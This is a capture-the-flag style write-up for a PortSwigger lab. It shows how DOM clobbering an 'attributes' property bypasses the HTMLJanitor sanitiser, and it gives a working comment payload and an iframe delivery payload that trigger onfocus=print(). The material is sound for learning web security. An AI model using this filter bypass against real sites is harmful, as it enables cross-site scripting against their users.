# Lab: Clobbering DOM attributes to bypass HTML filters (Expert)

**Lab:** [https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)

**Task (from PortSwigger):**  
This lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that calls the `print()` function. You may need to use the exploit server in order to make your vector auto-execute in the victim's browser.

**Note:** The intended solution to this lab will not work in Firefox. We recommend using Chrome to complete this lab.

## Vulnerability
The filter walks `element.attributes`. Clobbering `attributes` with an `<input id=attributes>` makes `.length` undefined so blacklisted attributes (e.g. `onfocus`) are not stripped.

## Solution

1. Comment on a blog post:

```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

2. Exploit server body (adjust `postId` to the post you commented on):

```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
```

3. Store and deliver to the victim. After load, `#x` focuses the form and runs `onfocus=print()`.

## Final Exploit Payloads

**Comment:**
```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

**Exploit server:**
```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
```
